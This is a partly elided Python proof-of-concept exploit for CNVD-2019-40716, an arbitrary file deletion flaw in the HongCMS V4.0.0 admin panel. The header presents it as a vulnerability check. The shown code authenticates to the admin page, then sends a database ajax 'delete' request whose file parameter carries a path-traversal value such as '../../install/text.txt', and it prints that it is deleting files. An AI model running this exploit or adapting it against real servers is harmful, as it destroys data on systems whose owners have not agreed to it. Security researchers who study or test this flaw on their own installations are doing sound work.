#!/usr/bin/env python3
#
# Single check to see if the server is still vulnerable to CNVD-2019-40716
# Written by: 秋水
# Company: 泽鹿安全
#
...
code = 'CNVD-2019-40716'
version = '1.0'
author = '秋水'
vulDate = '2020-04-09'
createDate = '2020-04-09'
updateDate = '2020-04-09'
name = 'HongCMS后台存在任意文件删除漏洞(CNVD-2019-40716)'
appPowerLink = 'http://www.hongcms.com'
appName = 'HongCMS'
appVersion = '''HongCMS V4.0.0'''
way = '''python CNVD-2019-40716.py -u http://127.0.0.1  -f ../../install/text.txt'''
...
def check():
    try:
        url1 = url + "/admin/index.php"
        rsp = session.get(url1)
        text = rsp.text
        ...
        if rsp1.status_code == 200 and "document.location" in str(text1):
            ...
            if count <= 2:
                ...
                if file.find(char1) != -1:
                    ...
                    endtime()
                elif file.find(char) != -1 and count == 1:
                    time.sleep(0.3)
                    print("[-] 请尝试删除install目录下的text.txt文件")
                    endtime()
                elif file.find(char) and count == 2:
                    num = file.find(char) + 3
                    filename = file[num:]
                    time.sleep(0.3)
                    print("[*] %s 正在删除文件..." % nowtime())
                    address1 = url + "/admin/index.php/database/ajax?action=delete&file=%s" % file
